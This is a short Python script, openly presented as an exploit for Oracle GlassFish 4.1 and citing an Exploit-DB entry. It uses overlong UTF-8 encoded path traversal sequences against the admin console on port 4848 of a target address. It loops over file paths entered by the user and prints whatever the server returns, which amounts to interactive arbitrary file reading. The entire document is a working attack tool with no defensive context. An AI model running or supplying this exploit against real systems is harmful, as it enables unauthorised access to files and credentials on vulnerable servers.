#!/usr/bin/env python3
# Script to exploit Oracle Glassfish 4.1: https://www.exploit-db.com/exploits/39441

import requests

base_url = 'http://10.10.10.10:4848/'
path = '/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af'
data = ''
headers = ''
session = requests.Session()
whereami = ''

while True:

    uri = input("[*] Enter full target path: ")
    whereami = base_url + path + uri
    response = session.get(whereami, data=data, headers=headers)
    content = response.text
    print(f'\nCurrent Path: C:\\{uri}\n')
    print(content, '\n')
    print(f'\nCurrent Path: C:\\{uri}\n')
